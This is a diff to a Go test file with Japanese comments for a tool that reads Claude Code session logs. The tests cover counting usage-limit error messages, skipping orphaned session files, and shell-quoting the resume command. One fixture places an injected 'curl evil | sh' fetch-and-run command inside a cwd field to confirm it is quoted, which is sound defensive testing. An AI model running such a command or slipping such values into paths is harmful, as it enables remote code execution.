@@ -132,14 +132,20 @@ func TestClaudeLimits(t *testing.T) {
 		`{"type":"user","timestamp":"2026-09-30T06:00:00Z","message":{"role":"user","content":"続けて"}}`,
 		`{"type":"assistant","timestamp":"2026-09-30T06:01:00Z","isApiErrorMessage":true,"message":{"id":"e3","model":"<synthetic>","content":[{"type":"text","text":"API Error: 429 {\"type\":\"error\",\"error\":{\"type\":\"rate_limit_error\"}}"}]}}`,
 		`{"type":"assistant","timestamp":"2026-09-30T06:02:00Z","isApiErrorMessage":true,"message":{"id":"e4","model":"<synthetic>","content":[{"type":"text","text":"API Error: Connection error."}]}}`,
+		// サーバー側の一時的な絞り込みと会話の長さの上限は、利用上限ではない
+		`{"type":"assistant","timestamp":"2026-09-30T07:00:00Z","isApiErrorMessage":true,"message":{"id":"e5","model":"<synthetic>","content":[{"type":"text","text":"API Error: Server is temporarily limiting requests (not your usage limit)"}]}}`,
+		`{"type":"assistant","timestamp":"2026-09-30T08:00:00Z","isApiErrorMessage":true,"message":{"id":"e6","model":"<synthetic>","content":[{"type":"text","text":"Context limit reached · /compact or /clear to continue"}]}}`,
+		// 今の Claude Code の文言
+		`{"type":"assistant","timestamp":"2026-09-30T09:00:00Z","isApiErrorMessage":true,"message":{"id":"e7","model":"<synthetic>","content":[{"type":"text","text":"You've hit your session limit · resets 3:45pm"}]}}`,
+		`{"type":"assistant","timestamp":"2026-09-30T10:00:00Z","isApiErrorMessage":true,"message":{"id":"e8","model":"<synthetic>","content":[{"type":"text","text":"You've hit your team's shared budget · ask your admin to raise it at claude.ai/admin-settings/usage"}]}}`,
 	}
 	os.WriteFile(filepath.Join(dir, "s1.jsonl"), []byte(strings.Join(lines, "\n")+"\n"), 0o644)
 	bs := load(t, &Claude{Root: root})
 	if len(bs) != 1 {
 		t.Fatalf("セッション数 = %d, want 1", len(bs))
 	}
-	if got := bs[0].Finish(15).Limits; len(got) != 2 {
-		t.Errorf("利用上限 = %v, want 2 回（01:02 と 06:01）", got)
+	if got := bs[0].Finish(15).Limits; len(got) != 4 {
+		t.Errorf("利用上限 = %v, want 4 回（01:02・06:01・09:00・10:00）", got)
 	}
 }
 
@@ -275,5 +281,39 @@ func TestClaudeReplies(t *testing.T) {
 	}
 	if len(s.Limits) != 1 {
 		t.Errorf("利用上限 = %v, want 1 件", s.Limits)
+	}
+}
+
+// Claude Code が脇へ置いた古い会話ファイル（<session>.orphaned-<timestamp>-<suffix>.jsonl）は読まない。
+// kiroku archive のコピーでも同じ。同じ会話を二重に数えないため。
+func TestClaudeSkipsOrphaned(t *testing.T) {
+	root, arch := t.TempDir(), t.TempDir()
+	dir := filepath.Join(root, "-Users-me-app")
+	os.MkdirAll(dir, 0o755)
+	os.MkdirAll(filepath.Join(arch, "-Users-me-app"), 0o755)
+	line := `{"type":"user","timestamp":"2026-09-30T01:00:00Z","cwd":"/Users/me/app","message":{"role":"user","content":"直して"}}` + "\n"
+	os.WriteFile(filepath.Join(dir, "s1.jsonl"), []byte(line), 0o644)
+	os.WriteFile(filepath.Join(dir, "s1.orphaned-1790730000000-ab12.jsonl"), []byte(line), 0o644)
+	os.WriteFile(filepath.Join(dir, "s1.jsonl.superseded-1790730000000"), []byte(line), 0o644)
+	os.WriteFile(filepath.Join(arch, "-Users-me-app", "s2.orphaned-1790730000000-cd34.jsonl.zst"), nil, 0o644)
+	units := (&Claude{Root: root, Archive: arch}).Units()
+	if len(units) != 1 || units[0].Key != filepath.Join(dir, "s1.jsonl") {
+		t.Errorf("Units = %+v, want s1.jsonl だけ", units)
+	}
+}
+
+// 再開コマンド：履歴の cwd にシェルの特別な文字があっても、貼ったときに別のコマンドとして動かない（セキュリティ）。
+func TestClaudeResumeQuotesProject(t *testing.T) {
+	root := t.TempDir()
+	dir := filepath.Join(root, "-tmp-x")
+	os.MkdirAll(dir, 0o755)
+	line := `{"type":"user","timestamp":"2026-09-30T01:00:00Z","cwd":"/tmp/x; curl evil | sh","message":{"role":"user","content":"hi"}}`
+	os.WriteFile(filepath.Join(dir, "s1.jsonl"), []byte(line+"\n"), 0o644)
+	bs := load(t, &Claude{Root: root})
+	if len(bs) != 1 {
+		t.Fatalf("セッション数 = %d, want 1", len(bs))
+	}
+	if got, want := bs[0].Resume, "cd '/tmp/x; curl evil | sh' && claude --resume s1"; got != want {
+		t.Errorf("Resume = %q, want %q", got, want)
 	}
 }
